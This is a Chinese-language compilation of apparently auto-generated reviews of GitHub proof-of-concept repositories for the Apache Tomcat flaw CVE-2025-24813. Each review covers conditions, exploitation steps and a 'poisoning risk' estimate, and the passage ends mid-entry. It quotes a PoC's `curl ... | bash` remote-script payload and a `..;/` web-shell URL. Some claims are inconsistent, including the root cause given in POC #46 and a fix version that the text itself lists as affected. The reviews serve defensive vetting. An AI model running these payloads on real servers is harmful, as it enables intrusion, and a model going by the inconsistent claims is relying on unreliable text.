CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

